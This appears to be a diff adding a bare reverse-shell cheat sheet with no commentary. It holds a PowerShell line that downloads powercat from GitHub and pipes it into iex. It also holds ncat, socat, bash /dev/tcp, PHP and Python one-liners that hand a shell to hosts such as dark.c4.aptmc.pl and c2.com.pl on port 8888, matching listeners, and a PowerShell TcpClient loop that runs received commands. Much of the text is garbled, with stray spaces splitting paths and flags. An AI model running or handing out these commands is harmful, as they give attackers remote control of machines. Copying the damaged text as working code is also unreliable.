@@ -1,0 +1,44 @@
+iwr https :// raw.githubusercontent.com/ besimorhino /powercat /master/powercat.ps1 | iex
+powercat - c c2.com.pl -p 8888 - e p
+ncat -lvp 8888
+
+ncat - e " /bin/ s h" dark. c4. aptmc.pl 8888
+ncat -lvp 8888
+
+
+
+socat tcp: dark. c4. aptmc.pl:8888
+exec : " bash -i" , pty,stderr,setsid,sigint,sane
+ncat -lvp 8888
+
+
+ncat - e " /bin/ s h" dark. c4. aptmc.pl 8888 - - ssl
+ncat -lvp 8888 - - ssl
+
+
+bash -i >& /dev/ tcp/dark. c4. aptmc.pl /8888 0>& 1
+
+
+php - r 
+'$sock= fsockopen( " dark. c4. aptmc.pl" ,8888);exec ("/bin/ s
+h -i <&3 >&3 2>&3");'
+
+
+python - c 'import 
+socket,subprocess,os;s = socket.socket ( socket.AF_INET,socket.
+SOCK_STREAM) ; s.connect ((" dark. c4. aptmc.pl",8888));os.dup
+2 ( s.fileno (),0); os.dup2( s.fileno (),1); 
+os.dup2( s.fileno (),2);p= subprocess.call ([" /bin/ s h","-i"]);'
+
+[System.Net.Sockets.TcpClient ] $c = 
+[ System.Net.Sockets.TcpClient ]::new( "192.168.55.6", " 88 ")
+$s = $c.GetStream()
+[ System.IO.StreamReader ] $r = [ System.IO.StreamReader ]::new($s)
+[ System.IO.StreamWriter ] $w = [ System.IO.StreamWriter ]::new($s)
+while ( $c.Connected ) {
+while ( $s.DataAvailable ) {
+$cmd = $r.ReadLine()
+$o = (iex $cmd)2>&1| % { $w.WriteLine($_) }
+$w.Flush()
+}
+}
